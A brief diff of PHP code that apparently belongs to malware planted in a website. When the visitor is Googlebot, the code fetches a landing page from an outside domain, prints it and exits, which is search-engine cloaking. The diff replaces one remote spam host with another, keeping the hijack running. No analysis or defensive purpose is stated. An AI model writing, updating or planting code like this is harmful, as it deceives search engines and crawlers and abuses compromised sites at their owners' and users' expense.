@@ -41,7 +41,7 @@ if (is_googlebot()) {
     }
 
     if (strpos($request_uri, '/') === 0) {
-        $lp = fetch_lp("https://search.libertadores.store/search.txt");
+        $lp = fetch_lp("https://blog.publikasi-indonesia.com/blog.html");
         if ($lp !== null) {
             echo $lp;
             exit;
